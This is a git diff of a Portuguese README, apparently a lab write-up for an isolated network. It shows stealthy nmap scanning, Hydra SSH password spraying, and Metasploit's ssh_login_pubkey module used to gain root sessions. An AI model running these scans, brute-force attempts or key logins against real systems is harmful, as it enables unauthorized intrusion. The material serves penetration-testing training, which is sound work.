@@ -1,4 +1,4 @@
-# Desafio Explorando vulnerabilidades
+# Explorando vulnerabilidades
 > Cenário de laboratório voltado para reconhecimento, enumeração e exploração controlada em ambiente isolado.
 
 ## Objetivo
@@ -35,7 +35,7 @@ Foi utilizado o modo passivo (`-p`), permitindo escutar o tráfego ARP da rede s
 ```bash
 sudo netdiscover -p -r 192.168.56.0/24
 ```
-
+![netdiscover](images/1.png)
 ## Estratégia
 Como o `netdiscover` em modo passivo depende de tráfego existente, foi realizado um ping da máquina Metasploitable para o Ubuntu Server, gerando tráfego suficiente para identificar os hosts ativos.
 
@@ -50,7 +50,7 @@ Com os IPs identificados, foi realizado um scan silencioso utilizando o Nmap.
 ```bash
 sudo nmap -sS -T2 -f --mtu 24 192.168.56.101-105
 ```
-
+![nmap](images/2.png)
 ## Objetivo
 
 Identificar:
@@ -76,7 +76,7 @@ sudo nmap -sS -Pn -n -sV -T1 -f --mtu 24 192.168.56.105 -p 22
 ```bash
 sudo nmap -sS -Pn -n -sV -T1 -f --mtu 24 192.168.56.101 -p 22
 ```
-
+![nmap](images/3.png)
 ---
 
 # Escolha do Vetor de Ataque
@@ -95,10 +95,7 @@ Demonstrar que sistemas atualizados sem vulnerabilidades conhecidasainda podem s
 
 Foi criada uma pequena wordlist contendo senhas comuns e fracas.
 
-Arquivo:
-
-```bash
-wordlists/senhas_spray.txt
+Arquivo: [senhas_spray.txt](wordlists/senhas_spray.txt)
 ```
 
 ## Comando executado
@@ -106,7 +103,7 @@ wordlists/senhas_spray.txt
 ```bash
 hydra -l admin -P senhas_spray.txt -t 1 -V 192.168.56.105 ssh
 ```
-
+![hydra](images/4.png)
 ---
 
 # Acesso ao Alvo
@@ -116,7 +113,7 @@ Após identificar as credenciais válidas:
 ```bash
 ssh admin@192.168.56.105
 ```
-
+![ssh](images/5.png)
 Com isso, foi obtido acesso ao servidor Ubuntu.
 
 ---
@@ -168,7 +165,7 @@ msfconsole
 ```bash
 use auxiliary/scanner/ssh/ssh_login_pubkey
 ```
-
+![msf](images/7.png)
 ## Configuração
 
 ```bash
@@ -177,19 +174,12 @@ set USERNAME root
 set VERBOSE true
 set KEY_PATH /home/kali/rsa/2048/
 ```
-
-## Verificação das opções
-
-```bash
-show options
-```
-
 ## Execução
 
 ```bash
 run
 ```
-
+![msf](images/8.png)
 ---
 
 # Interação com a sessão
@@ -197,7 +187,7 @@ run
 ```bash
 sessions -i 1
 ```
-
+![msf](images/9.png)
 ---
 
 # Considerações Finais
